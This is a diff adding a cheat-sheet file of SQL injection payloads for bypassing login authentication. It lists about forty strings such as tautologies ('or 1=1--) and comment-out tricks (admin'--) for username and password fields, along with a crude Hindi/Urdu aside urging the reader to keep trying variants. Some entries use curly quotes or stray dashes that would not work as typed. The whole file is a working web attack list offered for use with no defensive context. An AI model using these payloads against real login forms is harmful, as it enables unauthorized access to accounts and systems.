@@ -1,0 +1,44 @@
+SQLi Authentication Bypass :
+
+username: '--' / "--"
+password: '--' / "--"
+0'or'0'='0 => Betchod ye khi na Chalta Ye Try Kro ' or 1=1--
+1' AND 1=1 --+
+' or true --
+') or true–
+' or 1=1-
+1'or'1'='1
+1' or'1'='1
+‘ or ‘1’=’1
+admin'-
+"or 0=0-
+or 0=0-
+'or 0=0 #
+" or 0=0 #
+or 0=0 #
+'or'x'='x
+"or"x"="x
+')or('x'='x
+'or 1=1-
+admin'--
+='or'1=1
+'or1=1--
+'"or1=1--
+admin'--
+administrator'--
+superuser'--
+test'--
+'or 0=0--
+'or 0=0--'
+'or 0=0#
+"or 0=0--
+'"or0=0--
+or 0=0--
+'or 0=0#
+"or 0=0#
+or 0=0#
+'or'x'='x
+"or"x"="x
+')or('x'='x
+"or 1=1--
+or 1=1--
